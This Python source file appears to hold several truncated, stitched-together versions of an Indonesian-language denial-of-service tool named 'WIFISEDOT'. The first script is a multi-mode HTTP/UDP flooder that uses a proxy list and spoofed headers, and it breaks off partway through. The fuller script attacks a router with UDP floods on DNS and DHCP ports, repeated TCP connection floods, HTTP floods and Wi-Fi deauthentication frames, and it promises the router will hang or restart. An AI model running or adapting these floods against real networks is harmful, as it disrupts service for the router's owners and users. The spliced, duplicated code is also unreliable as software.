#!/usr/bin/env python3
import requests
import threading
import random
import time
import socket
import os
import sys
from urllib.parse import urlparse

# Warna
G = '\033[92m'
R = '\033[91m'
Y = '\033[93m'
C = '\033[96m'
W = '\033[0m'

os.system('clear')

# Banner
banner = f"""
{C}╔═══════════════════════════════════════════════════════╗
║            🔥 WIFISEDOT PRO - BARZZ_BOT 🔥             ║
║         Created by : @Barxzzz                          ║
║         Mode       : Multi-Attack (HTTP/UDP/ICMP)     ║
╚═══════════════════════════════════════════════════════╝{W}
"""
print(banner)

# Input
target = input(f"{G}[?] IP / Domain target: {W}")
port = int(input(f"{G}[?] Port (80/443/53): {W}") or 80)
threads = int(input(f"{G}[?] Jumlah thread (50-1000): {W}") or 200)
durasi = int(input(f"{G}[?] Durasi (detik): {W}") or 120)
mode = input(f"{G}[?] Mode (http/udp/icmp/all): {W}").lower() or "all"

# Proxy list (gratis)
proxy_list = [
    "http://103.150.102.2:8080",
    "http://103.150.102.3:8080",
    "http://103.150.102.4:8080",
    "http://103.150.102.5:8080",
    "http://103.150.102.6:8080",
    "http://103.150.102.7:8080",
    "http://103.150.102.8:8080",
    "http://103.150.102.9:8080",
    "http://103.150.102.10:8080",
    "http://103.150.102.11:8080",
    "http://103.150.102.12:8080",
    "http://103.150.102.13:8080",
    "http://103.150.102.14:8080",
    "http://103.150.102.15:8080"
]

# User-Agent acak
uas = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0) AppleWebKit/537.36",
    "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0",
    "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36",
]

# Path acak
paths = [
    "/", "/index.html", "/cgi-bin/", "/admin/", "/login",
    "/status", "/wifi", "/config", "/reboot", "/api/v1/status",
    "/wp-admin", "/phpmyadmin", "/cpanel", "/webmail",
    "/.env", "/backup.zip", "/config.php", "/db.sql"
]

# Variabel global
stop = False
counter_http = 0
counter_udp = 0
counter_icmp = 0
lock = threading.Lock()

# ========== HTTP ATTACK ==========
def http_attack():
    global counter_http
    while not stop:
        try:
            url = f"http://{target}:{port}{random.choice(paths)}"
            ua = random.choice(uas)
            proxy = random.choice(proxy_list) if random.random() > 0.5 else None

            headers = {
                "User-Agent": ua,
                "Accept": "*/*",
                "Connection": "keep-alive",
                "Cache-Control": "no-cache",
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            }

            if proxy:
                r = requests.get(url, headers=headers, proxies={"http": proxy, "https": proxy}, timeout=5)
            else:
                r = requests.get(url, headers=headers, timeout=5)

            with lock:
                counter_http += 1
                print(f"{G}[HTTP] #{counter_http} OK | Size: {len(r.content)} bytes{W}")

        except Exception as e:
            with lock:
                counter_http += 1
                print(f"{Y}[HTTP] #{counter_http} Error: {str(e)[:25]}{W}")
        time.sleep(random.uniform(0.01, 0.05))

# ========== UDP ATTACK ==========
def udp_attack():
    global counter_udp
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not stop:
        try:
            data = random._urandom(1024)  # 1KB random data
            sock.sendto(data, (target, port))
            with lock:#!/usr/bin/env python3
import requests
import threading
import random
import time
import socket
import os
import sys
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth
from scapy.layers.l2 import ARP, Ether

G = '\033[92m'
R = '\033[91m'
Y = '\033[93m'
C = '\033[96m'
W = '\033[0m'

os.system('clear')

print(f"""{C}
╔═══════════════════════════════════════════╗
║    💀 WIFISEDOT - MODE NGELEK 💀          ║
║    Created by : @Barxzzz                  ║
║    Efek      : Router hang / restart      ║
╚═══════════════════════════════════════════╝{W}
""")

target_ip = input(f"{G}[?] IP Router (contoh: 192.168.1.1): {W}")
target_mac = input(f"{G}[?] MAC Router (opsional, ketik 'auto' buat scan): {W}")
port = int(input(f"{G}[?] Port (80/443/53/67): {W}") or 80)
threads = int(input(f"{G}[?] Jumlah thread (100-1000): {W}") or 300)
durasi = int(input(f"{G}[?] Durasi (detik, 0 = forever): {W}") or 0)

stop = False
counter = 0
lock = threading.Lock()

# ========== UDP FLOOD (DNS & DHCP) ==========
def udp_flood():
    global counter
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ports = [53, 67, 68, 123, 161, 443]
    while not stop:
        try:
            target_port = random.choice(ports)
            data = random._urandom(2048)
            sock.sendto(data, (target_ip, target_port))
            with lock:
                counter += 1
                print(f"{C}[UDP] #{counter} -> {target_ip}:{target_port}{W}")
#!/usr/bin/env python3
import requests
import threading
import random
import time
import socket
import os
import sys
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth
from scapy.layers.l2 import ARP, Ether

G = '\033[92m'
R = '\033[91m'
Y = '\033[93m'
C = '\033[96m'
W = '\033[0m'

os.system('clear')

print(f"""{C}
╔═══════════════════════════════════════════╗
║    💀 WIFISEDOT - MODE NGELEK 💀          ║
║    Created by : @Barxzzz                  ║
║    Efek      : Router hang / restart      ║
╚═══════════════════════════════════════════╝{W}
""")

target_ip = input(f"{G}[?] IP Router (contoh: 192.168.1.1): {W}")
target_mac = input(f"{G}[?] MAC Router (opsional, ketik 'auto' buat scan): {W}")
port = int(input(f"{G}[?] Port (80/443/53/67): {W}") or 80)
threads = int(input(f"{G}[?] Jumlah thread (100-1000): {W}") or 300)
durasi = int(input(f"{G}[?] Durasi (detik, 0 = forever): {W}") or 0)

stop = False
counter = 0
lock = threading.Lock()

# ========== UDP FLOOD (DNS & DHCP) ==========
def udp_flood():
    global counter
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ports = [53, 67, 68, 123, 161, 443]
    while not stop:
        try:
            target_port = random.choice(ports)
            data = random._urandom(2048)
            sock.sendto(data, (target_ip, target_port))
            with lock:
                counter += 1
                print(f"{C}[UDP] #{counter} -> {target_ip}:{target_port}{W}")
        except:
            pass
        time.sleep(0.001)

# ========== SYN FLOOD ==========
def syn_flood():
    global counter
    while not stop:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            sock.connect((target_ip, port))
            sock.send(b"GET / HTTP/1.1\r\n\r\n")
            sock.close()
            with lock:
                counter += 1
                print(f"{G}[SYN] #{counter} connected{W}")
        except:
            with lock:
                counter += 1
                print(f"{Y}[SYN] #{counter} failed{W}")
        time.sleep(0.001)

# ========== DEAUTH (butuh monitor mode) ==========
def deauth_attack():
    if target_mac == "auto":
        print(f"{Y}[!] Auto scan MAC not implemented — skip deauth{W}")
        return
    while not stop:
        try:
            pkt = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target_mac, addr3=target_mac)/Dot11Deauth(reason=7)
            sendp(pkt, iface="wlan0mon", count=100, inter=0.01, verbose=0)
            with lock:
                counter += 100
                print(f"{R}[DEAUTH] 100 paket dikirim{W}")
        except:
            pass
        time.sleep(0.5)

# ========== HTTP FLOOD ==========
def http_flood():
    global counter
    uas = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0)",
        "Mozilla/5.0 (Linux; Android 13)"
    ]
    paths = ["/", "/cgi-bin/", "/admin/", "/status", "/api/v1"]
    while not stop:
        try:
            url = f"http://{target_ip}:{port}{random.choice(paths)}"
            r = requests.get(url, headers={"User-Agent": random.choice(uas)}, timeout=2)
            with lock:
                counter += 1
                print(f"{G}[HTTP] #{counter} OK{W}")
        except:
            with lock:
                counter += 1
                print(f"{Y}[HTTP] #{counter} failed{W}")
        time.sleep(0.01)

print(f"\n{G}[+] Menyerang {target_ip} dengan {threads} thread{W}")
print(f"{G}[+] Durasi: {'Forever' if durasi == 0 else str(durasi) + ' detik'}{W}")
print(f"{G}[+] Router akan ngelek dalam hitungan detik{W}\n")

# Jalankan semua serangan
attackers = [
    udp_flood, syn_flood, http_flood
]
if target_mac != "auto" and target_mac:
    attackers.append(deauth_attack)

for _ in range(threads // len(attackers)):
    for attack in attackers:
        t = threading.Thread(target=attack)
        t.daemon = True
        t.start()

# Timer
if durasi > 0:
    time.sleep(durasi)
    stop = True
else:
    input(f"\n{Y}[!] Tekan ENTER untuk stop serangan{W}")
    stop = True

print(f"\n{G}═══════════════════════════════════════════{W}")
print(f"{G}[✓] SERANGAN DIHENTIKAN{W}")
print(f"{G}[✓] Total paket: {counter}{W}")
print(f"{R}[✓] Router target kemungkinan sudah restart{W}")
print(f"{G}═══════════════════════════════════════════{W}")
